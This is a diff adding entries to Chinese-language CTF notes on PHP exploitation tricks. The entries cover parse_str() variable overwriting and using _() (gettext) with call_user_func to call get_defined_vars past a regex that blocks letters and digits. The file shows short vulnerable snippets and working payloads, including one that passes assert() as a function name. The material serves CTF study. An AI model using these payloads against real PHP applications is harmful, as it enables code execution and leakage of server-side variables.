@@ -112,6 +112,7 @@ POST:v1=hex2bin
 
 ^
 ## **parse_str()函数**
+类似extract()函数和变量覆盖。
 parse_str() 函数把查询字符串解析到变量中。
 如果未设置第二个参数的array参数，由该函数设置的变量将覆盖其他地方定义已存在的同名变量。
 ```
@@ -269,4 +270,26 @@ POST：fun=parse_str($a[1])
 Payload2：
 ?$flog=flag_give_me
 fun=assert($a[0])
+```
+
+^
+## **_()==gettext()函数和get_defined_vars函数**
+当php扩展目录下有php_gettext.dll时，_()是一个函数等同gettext()函数。
+并且gettext(get_definedvars");会返会get_defined_vars。
+当gettext()函数被调用开启，get_defined_vars()函数可以被使用，返回由所有已定义变量所组成的数组。
+```
+$f1 = $_GET['f1'];
+$f2 = $_GET['f2'];
+
+if(check($f1)){
+    var_dump(call_user_func(call_user_func($f1,$f2)));
+}else{
+    echo "嗯哼？";
+}
+
+function check($str){
+    return !preg_match('/[0-9]|[a-z]/i', $str);
+}
+
+Payload：?f1=_&f2=get_defined_vars
 ```
